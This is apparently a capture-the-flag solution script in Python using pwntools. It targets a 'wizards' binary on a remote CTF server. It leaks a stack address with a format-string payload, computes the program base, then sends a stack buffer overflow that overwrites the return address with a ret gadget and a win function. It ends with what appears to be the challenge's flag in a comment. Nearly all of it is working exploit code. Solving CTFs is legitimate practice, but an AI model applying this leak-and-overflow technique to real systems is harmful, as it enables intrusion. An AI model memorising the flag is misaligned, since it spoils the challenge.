#!/usr/bin/env python3

from os import getcwdb
from pwn import *


class Exploit:
    def __init__(self, p):
        self.sendline = p.sendline
        self.readuntil = p.readuntil

def get_base(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[0].split(b'-')[0],16)

def format_string(offset):
    return f'%{offset}$p'

def exploit(p):
    # leak addr via format string
    p.recvuntil(b'Enter your witch name:\n')
    # rbp - rsp = 256 (32 u64)
    p.sendline(b'%39$p')

    p.recvline()
    p.recvline()
    p.recvline()

    line = p.recvline()
    leaked_addr = int(line.split(b' ')[0], 16)
    base_addr = leaked_addr - 0x13b0
    leviosa_addr = base_addr + 0x1271
    ret_gadget = base_addr + 0x139c     # end of AAAAAAAA

    print('leak addr:', hex(leaked_addr))
    print('base addr:', hex(base_addr))
    print('leviosa addr:', hex(leviosa_addr))
    print('ret_gadget addr:', hex(ret_gadget))

    # call WINgardium_leviosa via buffer overflow
    # use ret_ganget to align rsp - otherwise there will be segfault
    buffer_size = 256
    buffer = b'Expelliarmus\0'
    buffer += b'A' * (buffer_size - len(buffer) + 8)
    buffer += p64(ret_gadget)   # rip after AAAAAAAA
    buffer += p64(leviosa_addr) # rip after ganget
    print(buffer)
    p.sendline(buffer)

def debug(p):
    base = get_base(p)
    print('local process base: 0x%x' % base)
    # 
    script = '''
    #b *welcome+106
    #b AAAAAAAA
    #b *AAAAAAAA+41
    #b *AAAAAAAA+118
    b *WINgardium_leviosa+59
    c
    '''
    gdb.attach(p, gdbscript=script)

p = remote('ctf-t.orb.ru', 36784)
#p = process('./wizards')
#debug(p)

exploit(p)


p.interactive()

# oren_ctf_Berners-Lee!